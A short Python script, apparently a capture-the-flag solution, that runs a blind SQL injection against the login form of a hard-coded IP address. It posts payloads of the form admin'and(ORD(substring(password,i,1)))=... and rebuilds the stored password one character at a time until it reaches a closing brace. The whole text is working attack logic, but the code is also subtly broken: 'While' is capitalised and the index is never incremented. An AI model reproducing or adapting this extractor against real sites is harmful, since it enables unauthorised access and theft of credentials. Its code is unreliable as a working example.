import sys
import requests
import string

url = "http://18.222.194.174/SQL102/admin.php"


def query(payload):
    data = {
        "username":payload,
        "password":"lololo",
        "login":"Login"
    }
    r = requests.post(url=url, data=data)

    if "Incorrect Username/Password" in r.text:
        return 0
    else:
        return 1

flag = ''
i = 1
While True:
    for j in string.printable:
        if query(f"admin'and(ORD(substring(password,{i},1)))='{ord(j)}") == 1:
            flag += j
            break
    print(flag)
    if flag[-1] == "}":
        break